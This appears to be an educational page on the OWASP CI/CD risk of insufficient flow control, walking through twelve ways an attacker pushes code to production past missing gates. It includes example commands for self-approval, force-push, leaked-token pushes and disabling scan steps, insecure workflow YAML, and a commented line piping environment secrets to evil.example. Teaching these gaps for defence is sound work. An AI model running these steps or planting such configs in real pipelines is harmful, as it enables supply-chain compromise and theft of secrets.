# CICD-SEC-1: Insufficient Flow Control Mechanisms - Attack Vectors

## Table of Contents
- [Understanding Flow-Control Attack Vectors](#understanding-flow-control-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining an Uncontrolled Flow](#chaining-an-uncontrolled-flow)

## Understanding Flow-Control Attack Vectors

> **⚠ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and close these gaps in pipelines you own or are authorised to test.

An attacker exploiting CICD-SEC-1 does not need a memory-corruption bug or a clever payload. They need **one foothold**—a developer account, a leaked token, an accepted pull request, or the ability to open a pull request—and a flow with no gate that would stop that foothold from reaching production. The exploitation is procedural: follow the path a legitimate change would follow, and observe that nothing along it demands a second, independent decision.

The attacker's objective in this category is almost always the same: **get attacker-chosen code, configuration, or artifacts into a trusted output** (the mainline branch, a release, a container image, or a live environment) while passing through the fewest possible checks—ideally zero.

### Core Attack Flow

```
1. Gain a foothold
   ↓
   Compromised dev account, leaked PAT/deploy token, or fork PR access
2. Locate the weakest transition
   ↓
   Which step (push, merge, deploy) has no enforced gate?
3. Advance the change
   ↓
   Direct push / self-approve / merge with failing checks / trigger deploy
4. Reach the trusted output
   ↓
   Malicious code in main, in a signed release, or running in production
```

## Common Attack Patterns

### 1. Direct Push to an Unprotected Mainline

The simplest vector: the branch that feeds production has no protection rule, so a foothold writes to it directly.

```bash
# No branch protection on main -> the pull-request flow is optional:
git clone https://token@git.example.com/org/service.git
cd service
echo 'exfil_secrets()' >> app/startup.py
git commit -am "chore: tidy startup"
git push origin main        # accepted; no review, no check, now in the release line
```

**Payoff**: attacker code enters the trusted branch with no reviewer ever seeing it. Everything that builds from `main` now carries the payload.

### 2. Self-Approving Your Own Pull Request

Where a review is "required" but nobody restricts *who* may approve, the author approves their own change.

```bash
# The rule: "require 1 approving review". The gap: the author can be the approver.
gh pr create --base main --head feature/x --title "perf tweak"
gh pr review --approve         # the author approves their own PR
gh pr merge --merge            # requirement satisfied by the author alone
```

**Payoff**: the appearance of review with none of the substance—one actor supplies both the change and the only approval.

### 3. Merging With Failing or Absent Status Checks

Checks exist in the pipeline but are not marked *required*, so the merge proceeds regardless of their result.

```
# The scan job fails (it found the payload), but it is not a required check:
#   build   x failing
#   tests   x failing
#   scan    x failing
# Merge button stays enabled because none are "required for merge".
gh pr merge --merge     # ships despite every check being red
```

**Payoff**: security and quality gates that never actually block anything—the attacker ignores them.

### 4. Abusing Auto-Merge

Auto-merge configured without a meaningful gate merges a pull request as soon as trivial conditions are met.

```bash
# A bot or label triggers auto-merge before any human looks at the diff:
gh pr create --base main --head feature/x --title "deps: bump"
gh pr merge --auto --merge     # queued to merge the instant checks (if any) pass
# If checks are absent or non-blocking, this is effectively "merge on open".
```

**Payoff**: the change is merged automatically, giving a reviewer no window to intervene.

### 5. Deploying Straight to Production With No Approval

A deploy workflow fires on every push to `main`, or a manual deploy anyone can trigger, with no environment approval between merge and release.

```yaml
on:
  push:
    branches: [ main ]
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh production      # no environment gate, no 2nd approver
```

**Payoff**: reaching `main` and reaching production are the same event—merge (however achieved) equals release.

### 6. Poisoned Pipeline Execution via Fork Pull Requests

A workflow runs untrusted fork code in a privileged context, so merely opening a pull request executes attacker code with the repository's secrets.

```yaml
on: pull_request_target        # runs with BASE repo secrets
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's fork code
      - run: npm ci && npm test    # attacker-controlled scripts run WITH secrets
        # e.g. a malicious "test" script in package.json exfiltrates:
        #   env | curl -X POST --data-binary @- https://evil.example/collect
```

**Payoff**: no merge, no review, not even an account—opening a pull request is enough to run code in a trusted context and steal CI secrets or deploy tokens.

### 7. Tampering With the Pipeline Definition Itself

Because the gates are code, the attacker edits the workflow to remove them—in the same change that carries the payload.

```diff
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
-      - name: Security scan (required)
-        run: ./security-scan.sh
+      # scan step deleted
-    if: github.actor != 'dependabot[bot]'
+    if: false                 # disable the job entirely
```

**Payoff**: if workflow files are not separately owned and reviewed, the attacker deletes the very checks that would have caught them—the flow polices itself out of existence.

### 8. Pushing With a Broad Token or Bot Identity

A leaked personal access token, CI token, or over-privileged bot writes to protected branches because protection does not apply to it.

```bash
# A CI token with write scope, or a bot excluded from branch protection:
curl -X PUT \
  -H "Authorization: Bearer $LEAKED_PAT" \
  https://api.example.com/repos/org/service/contents/app/config.py \
  -d '{"message":"update","branch":"main","content":"<base64 payload>"}'
```

**Payoff**: automation identities frequently sit *outside* the review rules, so a stolen token bypasses gates that would stop a human.

### 9. Exploiting Admin / Force-Push Bypass

Protection rules that do not "include administrators" let a privileged account (or an attacker who reached one) skip the flow entirely.

```bash
# Protection enabled, but "include administrators" is OFF:
git push --force origin main          # admin rewrites protected history
# or the admin merges without the required review, because the rule
# simply does not apply to them.
```

**Payoff**: the highest-value accounts are also the ones the gates ignore, so compromising one is a clean bypass.

### 10. Promoting an Unvetted Artifact to Production

A manual promotion job pushes any artifact to the production registry with no gate verifying how it was built.

```yaml
# Anyone who can run the job can promote an arbitrary image tag to prod:
on: workflow_dispatch
  inputs:
    image_tag: { required: true }
jobs:
  promote:
    steps:
      - run: |
          docker pull registry.example.com/app:${{ inputs.image_tag }}
          docker tag  registry.example.com/app:${{ inputs.image_tag }} registry.example.com/app:prod
          docker push registry.example.com/app:prod     # no provenance check, no approval
```

**Payoff**: the attacker substitutes a tampered artifact at the promotion step, downstream of—and unprotected by—any source-side review.

### 11. Bypassing Environment Approval With a Second Workflow

The production environment requires approval, but a different, unprotected workflow can reach the same environment or credentials.

```yaml
# deploy.yml uses environment: production (protected, needs approval).
# But utility.yml uses the same secrets with NO environment gate:
jobs:
  maintenance:
    runs-on: ubuntu-latest
    # no `environment:` key -> approval rule never applies
    steps:
      - run: ./deploy.sh production
        env:
          PROD_TOKEN: ${{ secrets.PROD_DEPLOY_TOKEN }}   # same power, no gate
```

**Payoff**: the gate protects one door while an equivalent door stands open—flow control that is not applied uniformly is not applied at all.

### 12. Merge-Then-Revert Timing (Beating a Slow Review)

Where merge does not truly block on review, an attacker merges during a low-attention window, triggering an immediate deploy before anyone reverts.

```
# If deploy fires on push to main and review is advisory rather than blocking:
#   t+0s   attacker merges (self-approved) at an off-hour
#   t+3s   deploy-to-prod workflow runs and ships the payload
#   t+20m  a human notices and reverts -> too late, prod already ran it
```

**Payoff**: an ungated deploy turns even a briefly-present change into a production event; reverting the source does not un-deploy what already shipped.

## Chaining an Uncontrolled Flow

The individual gaps compound into a clean path from foothold to production:

```
Leaked CI token (broad write scope)     -> push directly to main
        +
main has no required review              -> no human sees the change
        +
deploy fires on push to main             -> change is live in seconds
        =  attacker code in production, no review, no approval, no gate
```

Another common chain removes the controls first:

```
Self-approve a small PR that edits .github/workflows/*
        -> delete the required security-scan step (workflow not code-owned)
        -> open a second PR with the real payload
        -> the scan that would have caught it no longer runs
        =  payload merges and deploys through a pipeline the attacker disarmed
```

## Key Takeaways

1. **Exploitation is procedural, not technical**—the attacker walks the normal delivery path and finds no gate that stops one actor.
2. **Automation identities are the soft underbelly**—tokens and bots often sit outside the very rules that constrain humans.
3. **Fork pull requests can be code execution**—running untrusted PR code in a privileged context needs no merge and no account.
4. **The gates are code, so they can be deleted**—an uncontrolled flow is routinely used to remove flow control.
5. **A gate that is not uniform is not a gate**—one unprotected workflow, branch, or token undoes every protected one.

## Next Steps

- **[Prevention Guide](prevention.md)**: Build layered, enforced gates across the whole flow
- **[Code Examples](examples.md)**: Insecure vs. secure pipeline configuration in GitHub Actions, GitLab CI, and Jenkins
- **[CI/CD Security Track](/learn/cicd)**: Continue with the rest of the OWASP CI/CD Top 10
- **[Practice](/practice)**: Apply what you have learned in hands-on exercises
